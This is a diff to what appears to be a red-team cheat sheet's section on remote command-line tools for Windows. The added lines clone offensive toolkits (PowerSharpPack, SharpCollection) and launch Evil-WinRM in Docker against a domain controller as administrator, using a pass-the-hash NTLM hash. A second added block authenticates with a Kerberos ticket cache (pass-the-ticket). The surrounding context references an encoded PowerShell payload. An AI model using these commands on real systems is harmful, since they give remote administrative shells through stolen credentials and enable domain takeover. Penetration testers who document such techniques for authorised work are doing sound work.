@@ -89,8 +89,17 @@ powershell -EncodedCommand <Base64_payload>
 
 ### Tools for remote CLI connection
 * [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) [^1][^2]
+    ```bash
+    cd /opt
+    git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack
+    git clone https://github.com/Flangvik/SharpCollection
+    mkdir ~/Results/evil-winrm
+    sudo docker run --rm -ti --name evil-winrm -v /opt/PowerSharpPack/PowerSharpBinaries:/ps1_scripts -v /opt/SharpCollection/NetFramework_4.5_x64:/exe_files -v /home/kali/Results/evil-winrm:/data oscarakaelvis/evil-winrm -i DC01.ACME.LOCAL -u administrator -H 'db3d398badf62934dfa291db9a6ffdc0' -s '/ps1_scripts/' -e '/exe_files/'
     ```
-    bundle exec evil-winrm -s "/opt/PowerSharpPack/PowerSharpBinaries" -e "/opt/Sharp collection/NetFramework_4.5_x64" -i DC.ACME.LOCAL  -u administrator -p 'P@ssw0rd'
+    * Use below if making use of ptt (kerberos auth)
+    ```bash
+    export KRB5CCNAME=/tmp/administrator.ccache
+    bundle exec evil-winrm -s "/opt/PowerSharpPack/PowerSharpBinaries" -e "/opt/Sharp collection/NetFramework_4.5_x64" -i DC01.ACME.LOCAL -r acme.local
     ```
 [^1]: [Sharp Collection](https://github.com/Flangvik/SharpCollection)
 [^2]: [Power Sharp Pack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)
